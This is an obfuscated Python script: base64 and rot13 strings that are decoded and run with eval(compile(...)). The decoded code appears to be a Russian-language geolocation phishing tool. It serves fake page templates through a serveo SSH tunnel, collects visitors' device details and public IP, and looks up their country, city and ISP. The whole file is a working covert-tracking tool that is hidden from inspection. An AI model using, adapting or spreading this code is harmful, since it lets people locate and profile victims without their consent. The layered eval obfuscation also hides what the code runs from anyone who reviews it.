#bafomet
import base64, codecs
magic = 'IyEgL3Vzci9iaW4vZW52IHB5dGhvbgojIC0qLSBjb2Rpbmc6IHV0Zi04IC0qLQpSID0gJ1wwMzNbMzFtJyAgICMgUmVkCkcgPSAnXDAzM1sxOzM0bScgIyBCbHVlCkMgPSAnXDAzM1sxOzMybScgIyBHcmVlbgpXID0gJ1wwMzNbMG0nICAgICMgd2hpdGUKTyA9ICdcMDMzWzQ1bScgICAjIFB1cnBsZQpOID0gJ1wwMzNbMTszN20nICMgV2hpdGUKQiA9ICdcMDMzWzE7MzRtJyAjIEJsdWUKCmZyb20gc2h1dGlsIGltcG9ydCB3aGljaApmcm9tIHBpcC5fdmVuZG9yLmRpc3RsaWIuY29tcGF0IGltcG9ydCByYXdfaW5wdXQKaW1wb3J0IGdldHBhc3MKaW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IHRpbWUKaW1wb3J0IHN5cwppbXBvcnQgb3MKb3Muc3lzdGVtKCdjbGVhcicpCgoKcGtncyA9IFsncHl0aG9uMycsICdwaXAzJywgJ3BocCcsICdzc2gnXQppbnN0ID0gVHJ1ZQpmb3IgcGtnIGluIHBrZ3M6CglwcmVzZW50ID0gd2hpY2gocGtnKQoJaWYgcHJlc2VudCA9PSBOb25lOgoJCXByaW50KFIgKyAnWy1dICcgKyBXICsgcGtnICsgQyArICcgaXMgbm90IEluc3RhbGxlZCEnKQoJCWluc3QgPSBGYWxzZQoJZWxzZToKCQlwYXNzCmlmIGluc3QgPT0gRmFsc2U6CglleGl0KCkKZWxzZToKCXBhc3MKaW1wb3J0IGdldHBhc3MKaW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IHRpbWUKaW1wb3J0IG9zCmltcG9ydCBjc3YKaW1wb3J0IHN5cwppbXBvcnQgdGltZQppbXBvcnQganNvbgppbXBvcnQgYXJncGFyc2UKaW1wb3J0IHJlcXVlc3RzCmltcG9ydCBzdWJwcm9jZXNzIGFzIHN1YnAKCnBhcnNlciA9IGFyZ3BhcnNlLkFyZ3VtZW50UGFyc2VyKCkKcGFyc2VyLmFkZF9hcmd1bWVudCgnLXMnLCAnLS1zdWJkb21haW4nLCBoZWxwPSdQcm92aWRlIFN1YmRvbWFpbiBmb3IgU2VydmVvIFVSTCAoIE9wdGlvbmFsICknKQpwYXJzZXIuYWRkX2FyZ3VtZW50KCctaycsICctLWttbCcsIGhlbHA9J1Byb3ZpZGUgS01MIEZpbGVuYW1lICggT3B0aW9uYWwgKScpCnBhcnNlci5hZGRfYXJndW1lbnQoJy10JywgJy0tdHVubmVsJywgaGVscD0nU3BlY2lmeSBUdW5uZWwgTW9kZSBbIEF2YWlsYWJsZSA6IG1hbnVhbCBdJykKcGFyc2VyLmFkZF9hcmd1bWVudCgnLXAnLCAnLS1wb3J0JywgdHlwZT1pbnQsIGRlZmF1bHQ9ODA4MCwgaGVscD0nUG9ydCBmb3IgV2ViIFNlcnZlciBbIERlZmF1bHQgOiA4MDgwIF0nKQoKYXJncyA9IHBhcnNlci5wYXJzZV9hcmdzKCkKc3ViZG9tID0gYXJncy5zdWJkb21haW4Ka21sX2ZuYW1lID0gYXJncy5rbWwKdHVubmVsX21vZGUgPSBhcmdzLnR1bm5lbApwb3J0ID0gYXJncy5wb3J0Cgpyb3cgPSBbXQppbmZvID0gJycKcmVzdWx0ID0gJycKb3Muc3lzdGVtKCdjbGVhcicpCm9zLnN5c3RlbSgiY2QgdGVtcGxhdGUvYmFubmVyO3B5dGhvbjIgYmFubmVyLnB5IikKZGVmIGJhbm5lcigpOgoJcHJpbnQoQisiINCg0LXQttC40Lwg0LPQtdC+0LvQvtC60LDRhtC40LgiKQoJcHJpbnQoQisiINCa0L7Qs9C00LAg0YLRiyDQv9C+0LvRg9GH0LjQuyDQuNC90YTQvtGA0LzQsNGG0LjRjiDQuCDRhdC+0YfQtdGI0Ywg0L/RgNC+0YHRgtC+INCy0YvQudGC0Lgg0LIg0LPQu9Cw0LLQvdC+0LUg0LzQtdC90Y4sINC90LDQttC80LgiICtSKyAiIGN0cmwgKyBjIikKCQpkZWYgdHVubmVsX3NlbGVjdCgpOgoJaWYgdHVubmVsX21vZGUgPT0gTm9uZToKCQlzZXJ2ZW8oKQoJZWxpZiB0dW5uZWxfbW9kZSA9PSAnbWFudWFsJzoKCQlwcmludChHICsgJycgKyBDICsgJycgKyBXICsgJ1xuJykKCWVsc2U6CgkJcHJpbnQoUiArICdbICsgXScgKyBDICsgJyDQndC10LTQtdC50YHRgtCy0LjRgtC10LvRjNC90YvQuSDQstGL0LHRgNCw0L3QvdGL0Lkg0YDQtdC20LjQvCDRgtGD0L3QvdC10LvRjywg0J/RgNC+0LLQtdGA0YzRgtC1IE5ncm9rLiAgWy1oLCAtLWhlbHBdJyArIFcgKyAnXG4nKQoJCWV4aXQoKQoKZGVmIHRlbXBsYXRlX3NlbGVjdCgpOgoJZ2xvYmFsIHNpdGUsIGluZm8sIHJlc3VsdAoJcHJpbnQoUiArICcgWyArIF0nICsgQyArICcg0JLRi9Cx0LXRgNC40YLQtSDQvtC/0YbQuNGOIDogJyArIEMgKyAnXG4nKQoJCgl3aXRoIG9wZW4oJ3RlbXBsYXRlL3RlbXBsYXRlcy5qc29uJywgJ3InKSBhcyB0ZW1wbDoKCQl0ZW1wbF9pbmZvID0gdGVtcGwucmVhZCgpCgkKCXRlbXBsX2pzb24gPSBqc29uLmxvYWRzKHRlbXBsX2luZm8pCgkKCSMjIyMjCgkjZWQuIENvZGUgbDNlODYKCWxpc3RfdGVtcCA9IFtdCglmb3IgaXRlbSBpbiB0ZW1wbF9qc29uWyd0ZW1wbGF0ZXMnXToKCQluYW1lID0gaXRlbVsnbmFtZSddCgkJaWYgbGVuKG5hbWUpIDwgNTA6CgkJCW5hbV9wcm9iID0gNTAgLSBsZW4obmFtZSkKCQkJcHJvYmVscyA9ICcgJyAqIGludChuYW1fcHJvYikKCQkJCgkJCWluZGV4ID0gc3RyKHRlbXBsX2pzb25bJ3RlbXBsYXRlcyddLmluZGV4KGl0ZW0pKQoJCQluYW1faW5kZXggPSAnJwoJCQlpZiBsZW4oaW5kZXgpID09IDE6CgkJCSAgICBuYW1faW5kZXggPSAnMCcgKyBpbmRleAoJCQllbHNlOgoJCQkgICAgbmFtX2luZGV4ID0gaW5kZXgKCQkJCgkJCXJlc2FsdCA9IEcgKyAnIFsge30gXSAnLmZvcm1hdChuYW1faW5kZXgpICsgQyArICcge30ge30nLmZvcm1hdChuYW1lLCBwcm9iZWxzKSArIFcKCQkJbGlzdF90ZW1wLmFwcGVuZChyZXNhbHQpCgkJCgluYW1fY2Fsb21ucyA9IDMKCWZvciBpbmRleCBpbiByYW5nZSgwLCBsZW4obGlzdF90ZW1wKSwgbmFtX2NhbG9tbnMpOgoJCXJlc2FsdCA9IGxpc3RfdGVtcFtpbmRleDppbmRleCArIG5hbV9jYWxvbW5zXQoJCXByaW50KCcgJy5qb2luKG1hcChzdHIsIHJlc2FsdCkpKQoJIyMjIyMjIyMjIyMjCglwcmludCgiIikKCXNlbGVjdGVkID0gaW50KGlucHV0KFIgKyAiIFsiICsgQyArICIg0JLQstC10LTQu'
love = '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'
god = 'EgOiB7fScuZm9ybWF0KHBocF9zYykgKyBDICsgJ10nICsgVykKCWV4Y2VwdCByZXF1ZXN0cy5Db25uZWN0aW9uRXJyb3I6CgkJcHJpbnQoQyArICdbJyArIFIgKyAnINCU0LAg0LXQsdCw0L3Ri9C5INGA0L7RgiAnICsgQyArICddJyArIFcpCgkJUXVpdCgpCgpkZWYgd2FpdCgpOgoJcHJpbnRlZCA9IEZhbHNlCgl3aGlsZSBUcnVlOgoJCXRpbWUuc2xlZXAoMikKCQlzaXplID0gb3MucGF0aC5nZXRzaXplKHJlc3VsdCkKCQlpZiBzaXplID09IDAgYW5kIHByaW50ZWQgPT0gRmFsc2U6CgkJCXByaW50KCdcbicgKyBHICsgJ1sgKyBdJyArIFIgKyAnINCW0LTQtdC8INC/0L7Qu9GD0YfQtdC90LjRjyDQs9C10L4g0LTQsNC90L3Ri9GFLi4uJyArIFcgKyAnXG4nKQoJCQlwcmludGVkID0gVHJ1ZQoJCWlmIHNpemUgPiAwOgoJCQltYWluKCkKCmRlZiBtYWluKCk6CglnbG9iYWwgaW5mbywgcmVzdWx0LCByb3csIHZhcl9sYXQsIHZhcl9sb24KCXRyeToKCQlyb3cgPSBbXQoJCXdpdGggb3BlbiAoaW5mbywgJ3InKSBhcyBmaWxlMjoKCQkJZmlsZTIgPSBmaWxlMi5yZWFkKCkKCQkJanNvbjMgPSBqc29uLmxvYWRzKGZpbGUyKQoJCQlmb3IgdmFsdWUgaW4ganNvbjNbJ2RldiddOgoKCQkJCXZhcl9vcyA9IHZhbHVlWydvcyddCgkJCQl2YXJfcGxhdGZvcm0gPSB2YWx1ZVsncGxhdGZvcm0nXQoJCQkJdHJ5OgoJCQkJCXZhcl9jb3JlcyA9IHZhbHVlWydjb3JlcyddCgkJCQlleGNlcHQgVHlwZUVycm9yOgoJCQkJCXZhcl9jb3JlcyA9ICdOb3QgQXZhaWxhYmxlJwoJCQkJdmFyX3JhbSA9IHZhbHVlWydyYW0nXQoJCQkJdmFyX3ZlbmRvciA9IHZhbHVlWyd2ZW5kb3InXQoJCQkJdmFyX3JlbmRlciA9IHZhbHVlWydyZW5kZXInXQoJCQkJdmFyX3JlcyA9IHZhbHVlWyd3ZCddICsgJ3gnICsgdmFsdWVbJ2h0J10KCQkJCXZhcl9icm93c2VyID0gdmFsdWVbJ2Jyb3dzZXInXQoJCQkJdmFyX2lwID0gdmFsdWVbJ2lwJ10KCgkJCQlyb3cuYXBwZW5kKHZhcl9vcykKCQkJCXJvdy5hcHBlbmQodmFyX3BsYXRmb3JtKSAKCQkJCXJvdy5hcHBlbmQodmFyX2NvcmVzKSAKCQkJCXJvdy5hcHBlbmQodmFyX3JhbSkgCgkJCQlyb3cuYXBwZW5kKHZhcl92ZW5kb3IpCgkJCQlyb3cuYXBwZW5kKHZhcl9yZW5kZXIpCgkJCQlyb3cuYXBwZW5kKHZhcl9yZXMpCgkJCQlyb3cuYXBwZW5kKHZhcl9icm93c2VyKQoJCQkJcm93LmFwcGVuZCh2YXJfaXApCgoJCQkJcHJpbnQoRyArICdbICsgXScgKyBDICsgJyDQmNC90YTQvtGA0LzQsNGG0LjRjyDQviDRg9GB0YLRgNC+0LnRgdGC0LLQtS4uLiA6ICcgKyBSICsgJ1xuJykKCQkJCXByaW50KEcgKyAnWyArIF0nICsgQyArICcgT1MgICAgICAgICA6ICcgKyBXICsgdmFyX29zKQoJCQkJcHJpbnQoRyArICdbICsgXScgKyBDICsgJyBQbGF0Zm9ybSAgIDogJyArIFcgKyB2YXJfcGxhdGZvcm0pCgkJCQlwcmludChHICsgJ1sgKyBdJyArIEMgKyAnIENQVSBDb3JlcyAgOiAnICsgVyArIHZhcl9jb3JlcykKCQkJCXByaW50KEcgKyAnWyArIF0nICsgQyArICcgUkFNICAgICAgICA6ICcgKyBXICsgdmFyX3JhbSkKCQkJCXByaW50KEcgKyAnWyArIF0nICsgQyArICcgR1BVIFZlbmRvciA6ICcgKyBXICsgdmFyX3ZlbmRvcikKCQkJCXByaW50KEcgKyAnWyArIF0nICsgQyArICcgR1BVICAgICAgICA6ICcgKyBXICsgdmFyX3JlbmRlcikKCQkJCXByaW50KEcgKyAnWyArIF0nICsgQyArICcgUmVzb2x1dGlvbiA6ICcgKyBXICsgdmFyX3JlcykKCQkJCXByaW50KEcgKyAnWyArIF0nICsgQyArICcgQnJvd3NlciAgICA6ICcgKyBXICsgdmFyX2Jyb3dzZXIpCgkJCQlwcmludChHICsgJ1sgKyBdJyArIEMgKyAnIFB1YmxpYyBJUCAgOiAnICsgVyArIHZhcl9pcCkKCQkJCgoJCQkJcnFzdCA9IHJlcXVlc3RzLmdldCgnaHR0cDovL2ZyZWUuaXB3aG9pcy5pby9qc29uL3t9Jy5mb3JtYXQodmFyX2lwKSkKCQkJCXNjID0gcnFzdC5zdGF0dXNfY29kZQoKCQkJCWlmIHNjID09IDIwMDoKCQkJCQlkYXRhID0gcnFzdC50ZXh0CgkJCQkJZGF0YSA9IGpzb24ubG9hZHMoZGF0YSkKCQkJCQl2YXJfY29udGluZW50ID0gc3RyKGRhdGFbJ2NvbnRpbmVudCddKQoJCQkJCXZhcl9jb3VudHJ5ID0gc3RyKGRhdGFbJ2NvdW50cnknXSkKCQkJCQl2YXJfcmVnaW9uID0gc3RyKGRhdGFbJ3JlZ2lvbiddKQoJCQkJCXZhcl9jaXR5ID0gc3RyKGRhdGFbJ2NpdHknXSkKCQkJCQl2YXJfb3JnID0gc3RyKGRhdGFbJ29yZyddKQoJCQkJCXZhcl9pc3AgPSBzdHIoZGF0YVsnaXNwJ10pCgoJCQkJCXJvdy5hcHBlbmQodmFyX2NvbnRpbmVudCkKCQkJCQlyb3cuYXBwZW5kKHZhcl9jb3VudHJ5KQoJCQkJCXJvdy5hcHBlbmQodmFyX3JlZ2lvbikKCQkJCQlyb3cuYXBwZW5kKHZhcl9jaXR5KQoJCQkJCXJvdy5hcHBlbmQodmFyX29yZykKCQkJCQlyb3cuYXBwZW5kKHZhcl9pc3ApCgoJCQkJCXByaW50KEcgKyAnWyArIF0nICsgQyArICcg0JrQvtC90YLQuNC90LXQvdGCICA6ICcgKyBXICsgdmFyX2NvbnRpbmVudCkKCQkJCQlwcmludChHICsgJ1sgKyBdJyArIEMgKyAnINCh0YLRgNCw0L3QsCAgICA6ICcgKyBXICsgdmFyX2NvdW50cnkpCgkJCQkJcHJpbnQoRyArICdbICsgXScgKyBDICsgJyDQoNC10LPQuNC+0L0gICAgIDogJyArIFcgKyB2YXJfcmVnaW9uKQoJCQkJCXByaW50KEcgKyAnWyArIF0nICsgQyArICcg0JPQvtGA0L7QtCAgICAgICA6ICcgKyBXICsgdmFyX2NpdHkpCgkJCQkJcHJpbnQoRyArICdbICsgXScgKyBDICsgJyBPcmcgICAgICAgIDogJyArIFcgKyB2YXJfb3JnKQoJCQkJCXByaW50KEcgKyAnWyArIF0nICsgQyArICcgSVNQICAgICAgICA6ICcgKyBXICsgdmFyX2lzcCkKCWV4Y2VwdCBWYWx1ZUVycm9yOgoJCXBhc3MKCQoJdHJ5OgoJCXdpdGg'
destiny = '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'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
